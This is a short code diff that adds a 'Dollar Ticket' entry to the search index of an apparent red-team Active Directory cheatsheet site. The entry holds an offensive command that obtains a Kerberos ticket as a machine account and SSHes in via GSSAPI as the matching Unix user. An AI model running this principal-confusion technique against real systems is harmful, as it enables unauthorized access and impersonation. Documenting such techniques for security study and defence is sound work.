@@ -71,6 +71,15 @@ const staticEntries: SearchEntry[] = [
     tags: ["cheatsheet", "certipy", "adcs", "esc", "pki"],
   },
   {
+    id: "cmd-dollar-ticket",
+    type: "command",
+    title: "Dollar Ticket",
+    href: "/red-team/ad-exploit/exploitation/dollar-ticket",
+    summary: "Kerberos principal confusion (Linux/Samba AD): a <user>$ machine account maps to the Unix user <user> via auth_to_local, granting GSSAPI access as that user.",
+    command: "echo '$NEWPASS' | kinit '$TARGET_USER$@$REALM'; ssh -o PreferredAuthentications=gssapi-with-mic $TARGET_USER@$TARGET_HOST",
+    tags: ["dollar ticket", "kerberos", "ad", "linux", "samba", "auth_to_local", "gssapi", "machine account", "principal confusion"],
+  },
+  {
     id: "hub-ad",
     type: "hub",
     title: "Hub AD",
